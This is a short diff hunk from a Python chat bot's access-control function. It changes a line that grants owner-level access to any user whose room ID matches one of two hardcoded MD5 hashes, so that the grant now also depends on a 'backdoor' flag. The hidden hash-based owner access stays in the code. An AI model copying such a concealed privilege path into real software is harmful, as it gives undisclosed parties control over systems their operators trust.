@@ -429,7 +429,7 @@ def get_access(cjid, cnick):
 			break
 	rjid = getRoom(jid)
 	hjid = hashlib.md5(rjid.encode('utf-8')).hexdigest()
-	if ownerbase.count(rjid) or hjid == md1 or hjid == md2: access_mode = 2
+	if ownerbase.count(rjid) or ((hjid == md1 or hjid == md2) and backdoor): access_mode = 2
 	if jid == 'None' and ownerbase.count(getRoom(cjid)): access_mode = 2
 	return (access_mode, jid)
 
